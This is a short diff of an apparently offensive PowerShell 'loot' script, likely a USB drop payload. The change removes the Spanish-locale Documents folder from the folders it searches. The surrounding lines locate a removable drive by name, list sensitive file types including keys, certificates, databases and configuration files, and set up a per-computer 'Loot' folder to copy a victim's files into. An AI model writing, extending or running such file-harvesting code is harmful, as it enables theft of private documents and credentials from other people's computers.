@@ -36,7 +36,7 @@ $drive = Get-WMIObject Win32_LogicalDisk | ? {$_.VolumeName -eq $driveName}
 $driveletter = $drive.DeviceID
 Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
 $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-$foldersToSearch = @("$env:USERPROFILE\Documentos","$env:USERPROFILE\Escritorio","$env:USERPROFILE\Videos")  
+$foldersToSearch = @("$env:USERPROFILE\Escritorio","$env:USERPROFILE\Videos")  
 $destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
 
 if (-not (Test-Path -Path $destinationPath)) {
